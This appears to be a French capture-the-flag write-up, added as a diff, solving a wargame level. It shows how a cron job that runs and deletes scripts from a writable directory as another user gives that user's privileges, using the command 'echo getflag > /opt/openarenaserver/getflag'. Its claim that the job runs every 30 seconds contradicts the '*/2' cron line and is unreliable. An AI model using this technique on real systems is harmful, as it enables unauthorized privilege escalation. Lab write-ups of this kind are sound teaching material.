@@ -1,0 +1,21 @@
+Au log, on a le message "You have a new mail"
+On check donc ses mails dans /var/mail/level05:
+"*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05"
+
+Il s'agit d'une commande cron. Le binaire /usr/sbin/openarenaserver est execute par flag05 toutes les 30 secondes.
+
+ce binaire est :
+		#!/bin/sh
+
+		for i in /opt/openarenaserver/* ; do
+			(ulimit -t 5; bash -x "$i")
+			rm -f "$i"
+		done
+
+Il execute donc toute les commandes shell ecrites dans les fichiers contenu dans /opt/openarenaserver/ puis les supprime.
+
+On peut donc mettre la commande 'getflag > /tmp/flag05' dans un fichier dans ce dossier puis attendre 2 minutes avant de lire le contenu de /tmp/flag05.
+Donc pour obtenir le mot de passe du level 06, il suffit de faire la commande suivante:
+
+echo 'getflag > /tmp/flag05' > /opt/openarenaserver/getflag && sleep 31  && cat /tmp/flag05
+
